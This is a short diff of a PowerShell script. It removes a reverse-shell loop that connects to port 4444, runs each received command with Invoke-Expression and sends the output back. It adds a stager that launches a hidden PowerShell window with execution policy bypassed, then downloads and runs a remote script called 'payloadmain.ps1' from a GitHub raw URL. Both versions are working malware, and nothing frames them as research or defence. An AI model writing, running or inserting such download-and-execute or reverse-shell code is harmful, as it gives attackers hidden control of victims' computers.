@@ -1,20 +1,11 @@
-$tcpClient = New-Object Net.Sockets.TCPClient("127.0.0.1", 4444)
-$stream = $tcpClient.GetStream()
-$bufferSize = 4096
+# Get the current PowerShell process
+$currentProcess = Get-Process -Id $PID
 
-while ($true) {
-    $buffer = New-Object byte[] $bufferSize
-    $bytesRead = $stream.Read($buffer, 0, $buffer.Length)
+# Start a new hidden PowerShell process
+$newProcess = Start-Process powershell -PassThru -WindowStyle Hidden -ArgumentList @('-NoProfile', '-ExecutionPolicy Bypass', '-Command {powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EffortPeaked/gsdttsada/main/payloadmain.ps1');"}')
 
-    if ($bytesRead -eq 0) {
-        break
-    }
+# Wait for the new process to finish
+$newProcess.WaitForExit()
 
-    $receivedData = [Text.Encoding]::ASCII.GetString($buffer, 0, $bytesRead)
-    $commandOutput = Invoke-Expression -Command $receivedData 2>&1
-    $encodedOutput = [Text.Encoding]::ASCII.GetBytes($commandOutput)
-
-    $stream.Write($encodedOutput, 0, $encodedOutput.Length)
-}
-
-$tcpClient.Close()
+# Close the old PowerShell process
+Stop-Process -Id $currentProcess.Id
